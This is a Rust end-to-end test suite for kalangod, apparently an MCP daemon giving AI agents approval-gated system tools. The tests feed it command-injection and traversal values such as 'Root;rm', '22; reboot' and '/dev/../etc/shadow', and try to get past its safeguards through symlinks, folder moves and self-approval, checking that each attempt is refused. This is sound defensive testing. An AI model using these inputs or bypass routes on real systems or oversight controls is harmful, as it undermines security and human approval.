//! Testes de ponta a ponta: sobe o kalangod em modo de desenvolvimento (sem root, simulando ações de sistema)
//! e conversa com ele pelo protocolo MCP, como um agente faria.

use serde_json::{json, Value};
use std::io::{BufRead, BufReader, Write};
use std::os::unix::net::UnixStream;
use std::path::{Path, PathBuf};
use std::process::{Child, Command};
use std::time::Duration;

const BIN: &str = env!("CARGO_BIN_EXE_kalangod");

struct Daemon {
    child: Child,
    sock: PathBuf,
    _dir: tempfile::TempDir,
    _area: Option<tempfile::TempDir>,
    area: PathBuf,
    raiz: PathBuf,
}

impl Drop for Daemon {
    fn drop(&mut self) {
        let _ = self.child.kill();
    }
}

fn start() -> Daemon {
    start_with(true, "")
}

/// `dry_run` falso executa de verdade (sem root: só o que um usuário pode, numa raiz de teste).
fn start_with(dry_run: bool, extra: &str) -> Daemon {
    start_full(dry_run, extra, |c| c)
}

fn start_cfg(edit: impl Fn(String) -> String) -> Daemon {
    start_full(true, "", edit)
}

fn start_full(dry_run: bool, extra: &str, edit: impl Fn(String) -> String) -> Daemon {
    start_full_env(dry_run, extra, edit, &[])
}

/// With variables for kalangod (stand-ins for system commands).
fn start_full_env(dry_run: bool, extra: &str, edit: impl Fn(String) -> String, env: &[(&str, &str)]) -> Daemon {
    start_in(None, dry_run, extra, edit, env)
}

/// `area_in`: where the area is made (by default with the rest, under /tmp; a command's Landlock lets it write all of
/// /tmp, so the area of a test about what a command may write is elsewhere).
fn start_in(area_in: Option<&Path>, dry_run: bool, extra: &str, edit: impl Fn(String) -> String, env: &[(&str, &str)]) -> Daemon {
    let dir = tempfile::tempdir().unwrap();
    let area_dir = area_in.map(|b| tempfile::Builder::new().prefix("area").tempdir_in(b).unwrap());
    let area = area_dir.as_ref().map(|a| a.path().to_path_buf()).unwrap_or_else(|| dir.path().join("area"));
    std::fs::create_dir_all(area.join("segredo")).unwrap();
    std::fs::write(area.join("segredo/chave"), "não leia").unwrap();
    let sock = dir.path().join("mcp.sock");
    let cfg = format!(r#"
socket = "{sock}"
state_dir = "{state}"
protected_paths = ["{area}/segredo"]
approval_requires_tty = false
approval_timeout_s = 20
total_grant_s = 900
dry_run = {dry_run}
restore_root = "{raiz}"
trash_dir = "{raiz}/lixeira"
{extra}
[[callers]]
name = "teste"
max_level = "total"
allowed_paths = ["{area}"]
"#, sock = sock.display(), state = dir.path().join("estado").display(), area = area.display(), raiz = dir.path().join("raiz").display());
    std::fs::create_dir_all(dir.path().join("raiz/etc")).unwrap();
    let cfg_path = dir.path().join("kalangod.toml");
    // (the area is the test's home: its Documentos is the work folder commands write in — allowlist.rs)
    let mut cfg = edit(cfg);
    if !cfg.contains("\nhome = ") {
        cfg = format!("home = \"{}\"\n{cfg}", area.display());
    }
    // (the test is the person's interface: it may add and take out the folders commands write in)
    if !cfg.contains("interface_da_pessoa") {
        // (cargo runs tests with its own LD_LIBRARY_PATH: the one loader variable this "interface" may carry)
        let env: Vec<String> = ["LD_LIBRARY_PATH", "LD_PRELOAD"].iter().filter_map(|k| std::env::var(k).ok().map(|v| format!("{k}={v}"))).collect();
        cfg = format!("interface_da_pessoa = [\"{}\"]\ninterface_ambiente_permitido = {env:?}\n{cfg}", std::env::current_exe().unwrap().display());
    }
    std::fs::create_dir_all(area.join("Documentos")).unwrap();
    std::fs::write(&cfg_path, cfg).unwrap();
    let child = Command::new(BIN).env("LANGUAGE", "pt_BR").envs(env.iter().map(|(k, v)| (*k, v.replace("@AREA@", &area.display().to_string())))).args(["servir", "--config", cfg_path.to_str().unwrap()]).spawn().unwrap();
    for _ in 0..100 {
        if sock.exists() {
            break;
        }
        std::thread::sleep(Duration::from_millis(30));
    }
    let raiz = dir.path().join("raiz");
    Daemon { child, sock, _dir: dir, _area: area_dir, area, raiz }
}

struct Client {
    w: UnixStream,
    r: BufReader<UnixStream>,
    n: u64,
}

impl Client {
    fn new(sock: &Path) -> Client {
        // (kalangod may not be listening yet: tries for about 5 s)
        let mut tries = 0;
        let s = loop {
            match UnixStream::connect(sock) {
                Ok(s) => break s,
                Err(e) if tries < 100 => {
                    tries += 1;
                    let _ = e;
                    std::thread::sleep(Duration::from_millis(50));
                }
                Err(e) => panic!("kalangod did not accept the connection in 5 s: {e}"),
            }
        };
        Client { w: s.try_clone().unwrap(), r: BufReader::new(s), n: 0 }
    }
    fn rpc(&mut self, method: &str, params: Value) -> Value {
        self.n += 1;
        writeln!(self.w, "{}", json!({"jsonrpc": "2.0", "id": self.n, "method": method, "params": params})).unwrap();
        let mut line = String::new();
        self.r.read_line(&mut line).unwrap();
        serde_json::from_str(&line).unwrap()
    }
    fn call(&mut self, name: &str, args: Value) -> Value {
        self.rpc("tools/call", json!({"name": name, "arguments": args}))["result"].clone()
    }
}

/// Aprova o próximo pedido pendente a partir de outro processo (como o usuário faria no terminal).
fn approve_next(sock: PathBuf) -> std::thread::JoinHandle<String> {
    std::thread::spawn(move || {
        // (as long as the test's approval wait: a loaded machine shows the request late)
        for _ in 0..800 {
            let mut c = Client::new(&sock);
            let p = c.rpc("kalango/pendentes", json!({}));
            if let Some(id) = p["result"].as_array().and_then(|a| a.first()).and_then(|x| x["id"].as_u64()) {
                let out = Command::new(BIN).args(["aprovar", &id.to_string()]).env("KALANGOD_SOCKET", &sock).output().unwrap();
                return String::from_utf8_lossy(&out.stdout).into_owned() + &String::from_utf8_lossy(&out.stderr);
            }
            std::thread::sleep(Duration::from_millis(25));
        }
        "nenhum pedido".into()
    })
}

#[test]
fn protocolo_e_ferramentas() {
    let d = start();
    let mut c = Client::new(&d.sock);
    let init = c.rpc("initialize", json!({"protocolVersion": "2025-06-18", "capabilities": {}, "clientInfo": {"name": "teste", "version": "1"}}));
    assert_eq!(init["result"]["serverInfo"]["name"], "kalangod");
    let tools = c.rpc("tools/list", json!({}));
    let names: Vec<&str> = tools["result"]["tools"].as_array().unwrap().iter().map(|t| t["name"].as_str().unwrap()).collect();
    for n in ["sistema.info", "kernel.seguranca", "arquivos.escrever", "pacotes.instalar", "sistema.executar", "linha_do_tempo.desfazer"] {
        assert!(names.contains(&n), "falta {n}");
    }
    let info = c.call("sistema.info", json!({}));
    assert_eq!(info["isError"], false);
    assert!(info["structuredContent"]["kernel"].as_str().unwrap().len() > 3);
    let k = c.call("kernel.seguranca", json!({}));
    assert!(k["structuredContent"]["landlock_abi"].as_i64().unwrap() >= 1, "Landlock precisa estar ativo: {k}");
    assert_eq!(c.rpc("metodo/inexistente", json!({}))["error"]["code"], -32601);
}

#[test]
fn mover_para_uma_pasta_que_existe_poe_dentro() {
    // as `mv` does: the destination is an existing folder, so the file goes into it, keeping its name; a file
    // already there with that name is still refused (nothing is overwritten)
    let d = start();
    let mut c = Client::new(&d.sock);
    let a = d.area.join("Documentos/fatura.pdf");
    std::fs::write(&a, "pdf").unwrap();
    std::fs::create_dir_all(d.area.join("Documentos/PDFs")).unwrap();
    let mv = c.call("arquivos.mover", json!({"de": a, "para": d.area.join("Documentos/PDFs")}));
    assert_eq!(mv["isError"], false, "{mv}");
    assert!(d.area.join("Documentos/PDFs/fatura.pdf").exists() && !a.exists());
    assert_eq!(mv["structuredContent"]["para"], json!(d.area.join("Documentos/PDFs/fatura.pdf")));
    std::fs::write(&a, "outra").unwrap();
    let de_novo = c.call("arquivos.mover", json!({"de": a, "para": d.area.join("Documentos/PDFs")}));
    assert_eq!(de_novo["isError"], true, "{de_novo}");
    assert_eq!(std::fs::read_to_string(d.area.join("Documentos/PDFs/fatura.pdf")).unwrap(), "pdf");
}

#[test]
fn arquivos_com_desfazer() {
    let d = start();
    let mut c = Client::new(&d.sock);
    let a = d.area.join("Documentos/nota.md");
    let r = c.call("arquivos.escrever", json!({"caminho": a, "conteudo": "versão 1"}));
    assert_eq!(r["isError"], false, "{r}");
    c.call("arquivos.escrever", json!({"caminho": a, "conteudo": "versão 2"}));
    let lido = c.call("arquivos.ler", json!({"caminho": a}));
    assert_eq!(lido["structuredContent"]["conteudo"], "versão 2");

    let b = d.area.join("Documentos/pasta/nota-movida.md");
    let mv = c.call("arquivos.mover", json!({"de": a, "para": b}));
    let id = mv["structuredContent"]["registro"].as_u64().unwrap();
    assert!(b.exists() && !a.exists());

    // desfazer é nível sistema: precisa de aprovação de outro processo
    let h = approve_next(d.sock.clone());
    let u = c.call("linha_do_tempo.desfazer", json!({"id": id}));
    assert!(h.join().unwrap().contains("aprovado"));
    assert_eq!(u["isError"], false, "{u}");
    assert!(a.exists() && !b.exists(), "o arquivo devia voltar ao lugar original");
    assert_eq!(std::fs::read_to_string(&a).unwrap(), "versão 2");

    // desfazer de novo é recusado
    let h = approve_next(d.sock.clone());
    let again = c.call("linha_do_tempo.desfazer", json!({"id": id}));
    h.join().unwrap();
    assert_eq!(again["isError"], true);

    let tl = c.call("linha_do_tempo.listar", json!({}));
    assert!(tl["structuredContent"]["registros"].as_array().unwrap().iter().any(|e| e["status"] == "desfeito"));
}

/// "Desfazer tudo desde…": one approval undoes every reversible action since a moment (newest first), and the records
/// read by the agents center (`kalango/registros`, not recorded itself) say which were undone.
#[test]
fn undo_since_with_one_approval() {
    let d = start();
    let mut c = Client::new(&d.sock);
    let (a, b) = (d.area.join("Documentos/um.txt"), d.area.join("Documentos/dois.txt"));
    c.call("arquivos.escrever", json!({"caminho": a, "conteudo": "1"}));
    c.call("arquivos.escrever", json!({"caminho": b, "conteudo": "2"}));
    // (records have one-second resolution: the moves start in a later second than the writes)
    std::thread::sleep(std::time::Duration::from_millis(1100));
    let (a2, b2) = (d.area.join("Documentos/pasta/um.txt"), d.area.join("Documentos/pasta/dois.txt"));
    c.call("arquivos.mover", json!({"de": a, "para": a2}));
    let desde = c.rpc("kalango/registros", json!({}))["result"]["registros"].as_array().unwrap().last().unwrap()["time"].as_u64().unwrap();
    c.call("arquivos.mover", json!({"de": b, "para": b2}));
    assert!(a2.exists() && b2.exists());
    let antes = c.rpc("kalango/registros", json!({}))["result"]["registros"].as_array().unwrap().len();
    let h = approve_next(d.sock.clone());
    let u = c.call("linha_do_tempo.desfazer_desde", json!({"desde": desde}));
    assert!(h.join().unwrap().contains("aprovado"), "one approval");
    assert_eq!(u["isError"], false, "{u}");
    assert!(a.exists() && b.exists() && !a2.exists() && !b2.exists(), "both moves undone: {u}");
    let regs = c.rpc("kalango/registros", json!({}))["result"]["registros"].as_array().unwrap().clone();
    // only the moves were undone (the writes came before `desde`); reading the records added nothing
    assert!(regs.iter().filter(|e| e["tool"] == "arquivos.mover").all(|e| e["desfeito"] == true), "{regs:?}");
    assert!(regs.iter().filter(|e| e["tool"] == "arquivos.escrever").all(|e| e["desfeito"] == false), "{regs:?}");
    assert_eq!(u["structuredContent"]["desfeitos"].as_array().unwrap().len(), 2, "{u}");
    assert!(regs.len() > antes && regs.iter().filter(|e| e["tool"] == "kalango/registros").count() == 0);
}

#[test]
fn pastas_protegidas_e_fora_da_area() {
    let d = start();
    let mut c = Client::new(&d.sock);
    let segredo = d.area.join("segredo/chave");
    assert_eq!(c.call("arquivos.ler", json!({"caminho": segredo}))["isError"], true);
    // escapar com ..
    let escape = format!("{}/../../etc/hostname", d.area.display());
    assert_eq!(c.call("arquivos.ler", json!({"caminho": escape}))["isError"], true);
    // link simbólico dentro da área apontando para a pasta protegida
    std::os::unix::fs::symlink(d.area.join("segredo"), d.area.join("atalho")).unwrap();
    let r = c.call("arquivos.ler", json!({"caminho": d.area.join("atalho/chave")}));
    assert_eq!(r["isError"], true, "link para pasta protegida devia ser recusado: {r}");
    // listar a área não revela a pasta protegida
    let l = c.call("arquivos.listar", json!({"caminho": d.area}));
    let nomes: Vec<&str> = l["structuredContent"]["itens"].as_array().unwrap().iter().map(|i| i["nome"].as_str().unwrap()).collect();
    assert!(!nomes.contains(&"segredo"), "{nomes:?}");
}

/// The routes around a protected folder with the file tools, through the real kalangod: a link to a protected file
/// not created yet, and moving (or trashing) the folder that holds a protected one, to change it where it is not
/// protected and move it back.
#[test]
fn protected_folders_cannot_be_reached_around() {
    let d = start_cfg(|cfg| cfg.replace("/segredo\"]", "/cfg/kalango\"]"));
    let mut c = Client::new(&d.sock);
    let kalango = d.area.join("cfg/kalango");
    std::fs::create_dir_all(&kalango).unwrap();
    std::fs::write(kalango.join("agente-permissoes.json"), "{}").unwrap();
    std::fs::create_dir_all(d.area.join("Documentos")).unwrap();
    // a dangling link: writing through it would create cfg/kalango/conectores.json
    std::os::unix::fs::symlink(kalango.join("conectores.json"), d.area.join("Documentos/novo.json")).unwrap();
    let r = c.call("arquivos.escrever", json!({"caminho": d.area.join("Documentos/novo.json"), "conteudo": "x"}));
    assert_eq!(r["isError"], true, "{r}");
    assert!(!kalango.join("conectores.json").exists());
    // the folder holding it, moved away or to the trash, would carry it out of the protection
    let r = c.call("arquivos.mover", json!({"de": d.area.join("cfg"), "para": d.area.join("Documentos/cfg")}));
    assert_eq!(r["isError"], true, "{r}");
    let r = c.call("arquivos.lixeira", json!({"caminho": d.area.join("cfg")}));
    assert_eq!(r["isError"], true, "{r}");
    assert!(kalango.join("agente-permissoes.json").is_file());
    // nor can a folder made elsewhere be moved in to become it
    std::fs::create_dir_all(d.area.join("Documentos/outro/kalango")).unwrap();
    std::fs::remove_dir_all(d.area.join("cfg")).unwrap();
    let r = c.call("arquivos.mover", json!({"de": d.area.join("Documentos/outro"), "para": d.area.join("cfg")}));
    assert_eq!(r["isError"], true, "{r}");
    assert!(!d.area.join("cfg").exists());
    // the rest of the area works as before
    let r = c.call("arquivos.escrever", json!({"caminho": d.area.join("Documentos/notas.md"), "conteudo": "ok"}));
    assert_eq!(r["isError"], false, "{r}");
    let r = c.call("arquivos.mover", json!({"de": d.area.join("Documentos/notas.md"), "para": d.area.join("Documentos/notas2.md")}));
    assert_eq!(r["isError"], false, "{r}");
}

#[test]
fn trash_uses_the_configured_folder() {
    let d = start();
    let mut c = Client::new(&d.sock);
    let f = d.area.join("Documentos/velho.txt");
    std::fs::write(&f, "rascunho").unwrap();
    let r = c.call("arquivos.lixeira", json!({"caminho": f}));
    assert_eq!(r["isError"], false, "{r}");
    let at = r["structuredContent"]["na_lixeira"].as_str().unwrap().to_string();
    let raiz = d.area.parent().unwrap().join("raiz/lixeira");
    assert!(at.starts_with(raiz.to_str().unwrap()), "the test trash, not a real one: {at}");
    assert!(!f.exists() && std::path::Path::new(&at).exists());
    assert!(raiz.join("info/velho.txt.trashinfo").exists());
}

#[test]
fn reads_pdf_text_with_page_markers() {
    let d = start();
    let mut c = Client::new(&d.sock);
    let pdf = d.area.join("relatorio-out.pdf");
    std::fs::copy(concat!(env!("CARGO_MANIFEST_DIR"), "/tests/fixtures/relatorio-out.pdf"), &pdf).unwrap();
    let r = c.call("arquivos.ler", json!({"caminho": pdf}));
    assert_eq!(r["isError"], false, "{r}");
    let t = r["structuredContent"]["conteudo"].as_str().unwrap();
    assert_eq!(r["structuredContent"]["pdf_paginas"], 3, "{r}");
    let p2 = t.find("[p. 2]").expect("page 2 marker");
    let receita = t.find("Receita subiu 8%").expect("page 2 text");
    assert!(receita > p2 && t.find("[p. 3]").unwrap() > receita, "{t}");
    assert!(t.contains("20/11") && t.contains("despesas estáveis") && t.contains("Próxima revisão"), "accents must survive: {t}");
    // a broken PDF is an error, not a crash of the daemon
    std::fs::write(d.area.join("quebrado.pdf"), b"%PDF-1.4\nnot really a pdf").unwrap();
    assert_eq!(c.call("arquivos.ler", json!({"caminho": d.area.join("quebrado.pdf")}))["isError"], true);
    assert_eq!(c.call("arquivos.ler", json!({"caminho": pdf}))["isError"], false, "the daemon must still answer");
}

/// Approves the next request with "always" (as the approval screen's "Sempre" does).
fn approve_next_always(sock: PathBuf) -> std::thread::JoinHandle<String> {
    std::thread::spawn(move || {
        // (as long as the test's approval wait: a loaded machine shows the request late)
        for _ in 0..800 {
            let mut c = Client::new(&sock);
            let p = c.rpc("kalango/pendentes", json!({}));
            if let Some(id) = p["result"].as_array().and_then(|a| a.first()).and_then(|x| x["id"].as_u64()) {
                let out = Command::new(BIN).args(["aprovar", &id.to_string(), "--sempre"]).env("KALANGOD_SOCKET", &sock).output().unwrap();
                return String::from_utf8_lossy(&out.stdout).into_owned() + &String::from_utf8_lossy(&out.stderr);
            }
            std::thread::sleep(Duration::from_millis(25));
        }
        "nenhum pedido".into()
    })
}

#[test]
fn always_covers_only_the_same_request_and_can_be_taken_back() {
    let d = start();
    let mut c = Client::new(&d.sock);
    let args = json!({"nomes": ["cowsay"]});
    let h = approve_next_always(d.sock.clone());
    assert_eq!(c.call("pacotes.instalar", args.clone())["isError"], false);
    assert!(h.join().unwrap().contains("#"), "approved with always");
    // the same request again: no approval is asked (nobody approves here, and it still goes through)
    let t0 = std::time::Instant::now();
    let r = c.call("pacotes.instalar", args.clone());
    assert_eq!(r["isError"], false, "{r}");
    assert!(t0.elapsed() < Duration::from_secs(5));
    assert!(r["structuredContent"]["ponto_de_restauracao"].is_string(), "still a restore point first: {r}");
    // other arguments: asked again (approved here by the helper)
    let h = approve_next(d.sock.clone());
    assert_eq!(c.call("pacotes.instalar", json!({"nomes": ["sl"]}))["isError"], false);
    assert!(!h.join().unwrap().contains("nenhum pedido"), "a different request must ask");
    // listed, kept on disk, and taken back: then it asks again
    let l = c.rpc("kalango/sempre", json!({}));
    assert_eq!(l["result"]["respostas"].as_array().unwrap().len(), 1, "{l}");
    assert!(d.area.parent().unwrap().join("estado/aprovacoes-sempre.json").exists());
    let r = c.rpc("kalango/revogar_sempre", json!({"indice": 0}));
    assert!(r["result"]["revogada"]["tool"] == "pacotes.instalar", "{r}");
    let h = approve_next(d.sock.clone());
    assert_eq!(c.call("pacotes.instalar", args)["isError"], false);
    assert!(!h.join().unwrap().contains("nenhum pedido"), "after taking it back, it asks again");
    // full access is never "always"
    let h = approve_next_always(d.sock.clone());
    let r = c.call("sistema.executar", json!({"programa": "true", "argumentos": []}));
    let out = h.join().unwrap();
    assert!(out.contains("temporári") || out.contains("temporary"), "{out}");
    assert_eq!(r["isError"], true, "not approved: {r}");
}

#[test]
fn niveis_sistema_e_total() {
    let d = start();
    let mut c = Client::new(&d.sock);
    // nível sistema: aprovação + ponto de restauração; em simulação, nada é instalado
    let h = approve_next(d.sock.clone());
    let r = c.call("pacotes.instalar", json!({"nomes": ["cowsay"]}));
    h.join().unwrap();
    assert_eq!(r["isError"], false, "{r}");
    assert!(r["structuredContent"]["saida"].as_str().unwrap().contains("[simulado]"));
    assert!(r["structuredContent"]["ponto_de_restauracao"].is_string());
    assert_eq!(r["structuredContent"]["desfazivel"], true);
    // nomes que parecem opções são recusados
    let h = approve_next(d.sock.clone());
    let bad = c.call("pacotes.instalar", json!({"nomes": ["--allow-unauthenticated"]}));
    h.join().unwrap();
    assert_eq!(bad["isError"], true);

    // nível total: a primeira chamada pede aprovação e abre a concessão; a segunda não pede
    let h = approve_next(d.sock.clone());
    let t1 = c.call("sistema.executar", json!({"programa": "id"}));
    h.join().unwrap();
    assert_eq!(t1["isError"], false, "{t1}");
    let quem = c.rpc("kalango/quem", json!({}));
    assert!(quem["result"]["nivel_total_restante_s"].as_u64().unwrap() > 800);
    let t2 = c.call("sistema.executar", json!({"programa": "id"}));
    assert_eq!(t2["isError"], false);
}

#[test]
fn negar_e_autoaprovacao() {
    let d = start();
    let mut c = Client::new(&d.sock);
    let sock = d.sock.clone();
    let h = std::thread::spawn(move || {
        for _ in 0..200 {
            let mut c2 = Client::new(&sock);
            if let Some(id) = c2.rpc("kalango/pendentes", json!({}))["result"].as_array().and_then(|a| a.first()).and_then(|x| x["id"].as_u64()) {
                // o mesmo processo do pedido não pode aprovar
                let own = c2.rpc("kalango/decidir", json!({"id": id, "aprovar": true}));
                let out = Command::new(BIN).args(["negar", &id.to_string()]).env("KALANGOD_SOCKET", &sock).output().unwrap();
                return (own, String::from_utf8_lossy(&out.stdout).into_owned());
            }
            std::thread::sleep(Duration::from_millis(25));
        }
        (Value::Null, String::new())
    });
    let r = c.call("servicos.acao", json!({"nome": "cron.service", "acao": "parar"}));
    let (own, neg) = h.join().unwrap();
    assert!(own["error"]["message"].as_str().unwrap_or("").contains("próprio pedido"), "{own}");
    assert!(neg.contains("negado"));
    assert_eq!(r["isError"], true);
}

// ---------------------------------------------------------------------------------------------------------------
// Tarefas com limites (cgroup próprio) e Landlock. Sem root, o limite vem do systemd do usuário.

fn has_user_systemd() -> bool {
    Command::new("systemd-run").args(["--user", "--scope", "--quiet", "true"]).status().map(|s| s.success()).unwrap_or(false)
}

#[test]
fn tarefas_com_limites() {
    if !has_user_systemd() {
        eprintln!("sem systemd do usuário: teste pulado");
        return;
    }
    let d = start_with(false, "[limites]\nmemoria_mb = 256\ncpu_pct = 100\nprocessos = 64\ntempo_s = 30");
    let mut c = Client::new(&d.sock);
    // normal: roda, devolve a saída e o código
    let r = c.call("tarefas.executar", json!({"programa": "sh", "argumentos": ["-c", "echo olá; exit 3"], "pasta": d.area}));
    assert_eq!(r["isError"], false, "{r}");
    let v = &r["structuredContent"];
    assert_eq!(v["saida"], "olá\n", "{v}");
    assert_eq!(v["codigo"], 3);
    // memória: pede 400 MB com limite de 64 MB → morto pelo kernel (OOM dentro do cgroup da tarefa)
    let r = c.call("tarefas.executar", json!({"programa": "python3", "argumentos": ["-c", "x = bytearray(400*1024*1024); print('não devia chegar aqui')"], "memoria_mb": 64}));
    let v = &r["structuredContent"];
    assert_eq!(v["estourou_memoria"], true, "{v}");
    assert_eq!(v["sinal"], 9, "{v}");
    assert!(!v["saida"].as_str().unwrap().contains("chegar"));
    // o agente não consegue pedir mais que a configuração
    assert_eq!(v["limites"]["memoria_mb"], 64);
    let r = c.call("tarefas.executar", json!({"programa": "true", "memoria_mb": 999999}));
    assert_eq!(r["structuredContent"]["limites"]["memoria_mb"], 256);
    // tempo: encerrada no limite
    let r = c.call("tarefas.executar", json!({"programa": "sleep", "argumentos": ["30"], "tempo_s": 1}));
    let v = &r["structuredContent"];
    assert_eq!(v["estourou_tempo"], true, "{v}");
    assert!(v["tempo_ms"].as_u64().unwrap() < 5000, "{v}");
    // processos: com limite de 8, criar 40 falha
    let r = c.call("tarefas.executar", json!({"programa": "python3", "argumentos": ["-c", "import os,time\nn=0\nfor i in range(40):\n  try:\n    if os.fork()==0:\n      time.sleep(2); os._exit(0)\n    n+=1\n  except OSError: pass\nprint(n)"], "processos": 8}));
    let n: u32 = r["structuredContent"]["saida"].as_str().unwrap().trim().parse().unwrap_or(99);
    assert!(n < 8, "devia ter criado menos de 8 processos, criou {n}: {r}");
    // Landlock: escreve na área permitida, não fora dela (mesmo onde o usuário poderia)
    let home = std::env::var("HOME").unwrap();
    let fora = format!("{home}/.kalango-teste-landlock-{}", std::process::id());
    let r = c.call("tarefas.executar", json!({"programa": "sh", "argumentos": ["-c", format!("echo a > {}/Documentos/dentro.txt && echo b > {fora}", d.area.display())]}));
    let v = &r["structuredContent"];
    assert!(d.area.join("Documentos/dentro.txt").exists(), "{v}");
    assert!(!Path::new(&fora).exists(), "Landlock devia impedir escrever em {fora}: {v}");
    assert!(v["erros"].as_str().unwrap().contains("Permission denied"), "{v}");
    // pasta fora da área é recusada antes de rodar
    let r = c.call("tarefas.executar", json!({"programa": "true", "pasta": "/etc"}));
    assert_eq!(r["isError"], true);
}

// ---------------------------------------------------------------------------------------------------------------
// Pontos de restauração reais (cópia do /etc numa raiz de teste): criar, mudar, restaurar e desfazer a restauração.

#[test]
fn pontos_de_restauracao() {
    let d = start_with(false, "pontos_max = 3");
    let etc = d.raiz.join("etc");
    std::fs::create_dir_all(etc.join("rede")).unwrap();
    std::fs::write(etc.join("hostname"), "kalango\n").unwrap();
    std::fs::write(etc.join("rede/config"), "dhcp=sim\n").unwrap();
    std::os::unix::fs::symlink("hostname", etc.join("atalho")).unwrap();
    let mut c = Client::new(&d.sock);

    let h = approve_next(d.sock.clone());
    let p = c.call("pontos.criar", json!({"descricao": "antes do teste"}));
    h.join().unwrap();
    assert_eq!(p["isError"], false, "{p}");
    let id = p["structuredContent"]["ponto"]["id"].as_str().unwrap().to_string();
    assert_eq!(p["structuredContent"]["ponto"]["tipo"], "arquivos");

    // muda tudo: troca, cria, apaga
    std::fs::write(etc.join("hostname"), "outro\n").unwrap();
    std::fs::write(etc.join("novo.conf"), "x").unwrap();
    std::fs::remove_dir_all(etc.join("rede")).unwrap();

    // o plano mostra exatamente o que vai mudar
    let h = approve_next(d.sock.clone());
    let plano = c.call("pontos.restaurar", json!({"id": id, "so_plano": true}));
    h.join().unwrap();
    let pl = &plano["structuredContent"]["plano"]["etc"];
    assert_eq!(pl["apagar"], json!(["novo.conf"]), "{plano}");
    assert_eq!(pl["trocar"], json!(["hostname"]));
    assert!(pl["recriar"].as_array().unwrap().contains(&json!("rede/config")));
    assert!(etc.join("novo.conf").exists(), "só plano não muda nada");

    let h = approve_next(d.sock.clone());
    let r = c.call("pontos.restaurar", json!({"id": id}));
    h.join().unwrap();
    assert_eq!(r["isError"], false, "{r}");
    assert_eq!(std::fs::read_to_string(etc.join("hostname")).unwrap(), "kalango\n");
    assert_eq!(std::fs::read_to_string(etc.join("rede/config")).unwrap(), "dhcp=sim\n");
    assert!(!etc.join("novo.conf").exists());
    assert_eq!(std::fs::read_link(etc.join("atalho")).unwrap(), Path::new("hostname"));

    // a restauração também se desfaz (volta ao estado de logo antes dela)
    let reg = r["structuredContent"]["registro"].as_u64().unwrap();
    let h = approve_next(d.sock.clone());
    let u = c.call("linha_do_tempo.desfazer", json!({"id": reg}));
    h.join().unwrap();
    assert_eq!(u["isError"], false, "{u}");
    assert_eq!(std::fs::read_to_string(etc.join("hostname")).unwrap(), "outro\n");
    assert!(etc.join("novo.conf").exists());
    assert!(!etc.join("rede").exists());

    // toda ação de nível sistema cria o seu ponto antes; a retenção mantém só 3
    let l = c.call("pontos.listar", json!({}));
    let n = l["structuredContent"]["pontos"].as_array().unwrap().len();
    assert!(n <= 3 && n >= 2, "{l}");
}

// ---------------------------------------------------------------------------------------------------------------
// Ferramentas de administração: as de leitura rodam de verdade; as de mudança validam entradas e respeitam a simulação.

#[test]
fn administracao() {
    let d = start();
    let mut c = Client::new(&d.sock);
    let names: Vec<String> = c.rpc("tools/list", json!({}))["result"]["tools"].as_array().unwrap().iter().map(|t| t["name"].as_str().unwrap().to_string()).collect();
    for t in ["rede.conexoes", "rede.wifi", "rede.conexao", "firewall.estado", "firewall.regra", "firewall.ligar", "discos.dispositivos", "discos.saude",
        "discos.montar", "discos.desmontar", "usuarios.listar", "usuarios.criar", "usuarios.remover", "usuarios.grupo", "atualizacoes.listar",
        "atualizacoes.verificar", "atualizacoes.aplicar", "pacotes.versoes", "tarefas.executar", "pontos.listar", "pontos.criar", "pontos.restaurar"] {
        assert!(names.contains(&t.to_string()), "falta {t}");
    }
    let u = c.call("usuarios.listar", json!({}));
    assert_eq!(u["isError"], false, "{u}");
    let me = std::env::var("USER").unwrap_or_default();
    assert!(u["structuredContent"]["usuarios"].as_array().unwrap().iter().any(|x| x["nome"] == me.as_str()), "{u}");
    let dsk = c.call("discos.dispositivos", json!({}));
    assert_eq!(dsk["isError"], false, "{dsk}");
    assert!(!dsk["structuredContent"]["blockdevices"].as_array().unwrap().is_empty());
    let n = c.call("rede.conexoes", json!({}));
    assert_eq!(n["isError"], false, "{n}");
    let a = c.call("atualizacoes.listar", json!({}));
    assert_eq!(a["isError"], false, "{a}");

    // entradas perigosas são recusadas antes de qualquer aprovação ou execução
    for (tool, args) in [
        ("discos.saude", json!({"dispositivo": "/dev/../etc/shadow"})),
        ("discos.saude", json!({"dispositivo": "/etc/passwd"})),
    ] {
        let r = c.call(tool, args.clone());
        assert_eq!(r["isError"], true, "{tool} {args}");
    }
    for (tool, args) in [
        ("usuarios.criar", json!({"nome": "--badname"})),
        ("usuarios.criar", json!({"nome": "Root;rm"})),
        ("usuarios.remover", json!({"nome": "root"})),
        ("usuarios.remover", json!({"nome": me})),
        ("firewall.regra", json!({"acao": "permitir", "porta": "22; reboot"})),
        ("pacotes.versoes", json!({"versoes": ["bash=--force"]})),
    ] {
        let h = approve_next(d.sock.clone());
        let r = c.call(tool, args.clone());
        h.join().unwrap();
        assert_eq!(r["isError"], true, "{tool} {args} devia ser recusado: {r}");
    }
    // em simulação, mudanças válidas descrevem o comando e trazem o inverso
    let h = approve_next(d.sock.clone());
    let r = c.call("firewall.regra", json!({"acao": "permitir", "porta": "8080/tcp"}));
    h.join().unwrap();
    assert!(r["structuredContent"]["saida"].as_str().unwrap().contains("[simulado] ufw allow 8080/tcp"), "{r}");
    assert_eq!(r["structuredContent"]["desfazivel"], true);
    let h = approve_next(d.sock.clone());
    let r = c.call("usuarios.criar", json!({"nome": "kalango-teste", "nome_completo": "Teste"}));
    h.join().unwrap();
    assert!(r["structuredContent"]["saida"].as_str().unwrap().contains("[simulado] useradd -m -s /bin/bash -c Teste kalango-teste"), "{r}");
}

// ---------------------------------------------------------------------------------------------------------------

#[test]
fn concessao_total_expira() {
    let d = start_cfg(|c| c.replace("total_grant_s = 900", "total_grant_s = 1"));
    let mut c = Client::new(&d.sock);
    let h = approve_next(d.sock.clone());
    assert_eq!(c.call("sistema.executar", json!({"programa": "true"}))["isError"], false);
    h.join().unwrap();
    std::thread::sleep(Duration::from_millis(1500));
    assert!(c.rpc("kalango/quem", json!({}))["result"]["nivel_total_restante_s"].is_null(), "concessão devia ter expirado");
    // depois do prazo, pede aprovação de novo: sem ninguém aprovar, a chamada espera e é negada pelo prazo curto
    let neg = std::thread::spawn({
        let sock = d.sock.clone();
        move || {
            for _ in 0..200 {
                let mut c2 = Client::new(&sock);
                if let Some(id) = c2.rpc("kalango/pendentes", json!({}))["result"].as_array().and_then(|a| a.first()).and_then(|x| x["id"].as_u64()) {
